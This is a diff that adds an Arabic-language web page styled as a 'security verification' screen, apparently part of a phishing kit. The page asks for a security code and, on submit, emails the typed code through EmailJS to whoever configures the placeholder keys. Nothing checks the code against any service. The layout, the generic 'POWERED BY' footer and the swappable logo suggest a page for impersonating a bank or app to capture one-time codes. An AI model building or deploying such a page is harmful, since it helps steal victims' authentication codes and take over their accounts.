@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>التحقق الأمني</title>
+    
+    <!-- Google Fonts for Arabic Typography -->
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    
+    <!-- FontAwesome for Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Cairo', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(180deg, #18233a 0%, #1c315e 100%);
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Header section */
+        .header {
+            width: 100%;
+            padding: 20px;
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            gap: 10px;
+            font-size: 14px;
+            color: #a0aec0;
+        }
+
+        /* Logo */
+        .logo-container {
+            margin-top: 40px;
+            margin-bottom: 30px;
+        }
+
+        .logo-container img {
+            width: 100px;
+            height: auto;
+        }
+
+        /* Main Form Container */
+        .login-container {
+            width: 90%;
+            max-width: 400px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .login-title {
+            text-align: right;
+            font-size: 24px;
+            margin-bottom: 20px;
+            font-weight: 700;
+        }
+
+        /* Input Groups */
+        .input-group {
+            position: relative;
+            margin-bottom: 25px; /* Increased margin since it's the only input */
+        }
+
+        .input-group input {
+            width: 100%;
+            background-color: rgba(255, 255, 255, 0.1);
+            border: none;
+            border-radius: 12px;
+            padding: 18px 45px 18px 15px;
+            color: #ffffff;
+            font-size: 16px;
+            outline: none;
+        }
+
+        .input-group input::placeholder {
+            color: #a0aec0;
+        }
+
+        /* Right-side icons */
+        .input-icon-right {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #a0aec0;
+            font-size: 18px;
+        }
+
+        /* Buttons Row */
+        .buttons-row {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .btn-submit {
+            background-color: #4da8fa;
+            color: #ffffff;
+            border: none;
+            border-radius: 12px;
+            width: 100%; /* Make it full width since QR button is removed */
+            padding: 15px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .btn-submit:hover {
+            background-color: #3b91e0;
+        }
+
+        /* Footer */
+        .footer {
+            margin-top: auto;
+            padding-bottom: 30px;
+            text-align: center;
+            color: #a0aec0;
+            font-size: 12px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .footer-logo {
+            width: 40px;
+            opacity: 0.6;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header Section -->
+    <div class="header">
+        <span>الإنكليزية</span>
+        <i class="fa-solid fa-headset"></i>
+    </div>
+
+    <!-- Logo Section -->
+    <div class="logo-container">
+        <!-- REPLACE "YOUR_LOGO_LINK_HERE" WITH YOUR ACTUAL IMAGE URL -->
+        <img id="dynamic-logo" src="https://i.imgur.com/WnTTBP5.png" alt="Logo">
+    </div>
+
+    <!-- Login Form -->
+    <div class="login-container">
+        <h1 class="login-title">ادخل رمز الأمان</h1>
+
+        <form id="security-form">
+            <!-- Security Code Input -->
+            <div class="input-group">
+                <i class="fa-solid fa-shield-halved input-icon-right"></i>
+                <input type="text" id="security_code" placeholder=" رمز الامان" required>
+            </div>
+
+            <!-- Action Buttons -->
+            <div class="buttons-row">
+                <button type="submit" class="btn-submit">تأكيد</button>
+            </div>
+        </form>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+        <span>POWERED BY</span>
+        <i class="fa-solid fa-shield-halved" style="font-size: 30px;"></i>
+        <span>V 2.2.6</span>
+    </div>
+
+    <!-- JavaScript for Functionality -->
+    <script>
+        // EmailJS Integration
+        // Initialize EmailJS - REPLACE WITH YOUR PUBLIC KEY
+        emailjs.init("YOUR_PUBLIC_KEY");
+
+        document.getElementById('security-form').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent standard form submission
+
+            // Change button text to show loading state
+            const submitBtn = document.querySelector('.btn-submit');
+            const originalText = submitBtn.innerText;
+            submitBtn.innerText = 'جاري التحميل...';
+
+            // Collect parameters
+            const templateParams = {
+                security_code: document.getElementById('security_code').value
+            };
+
+            // Send via EmailJS - REPLACE WITH YOUR SERVICE ID AND TEMPLATE ID
+            emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", templateParams)
+                .then(function(response) {
+                    console.log('SUCCESS!', response.status, response.text);
+                    submitBtn.innerText = originalText;
+                    
+                    alert('تم الإرسال بنجاح');
+                    
+                    // Optional: Clear the input after success
+                    // document.getElementById('security_code').value = '';
+                }, function(error) {
+                    console.log('FAILED...', error);
+                    submitBtn.innerText = originalText;
+                    alert('حدث خطأ أثناء الإرسال');
+                });
+        });
+    </script>
+</body>
+</html>
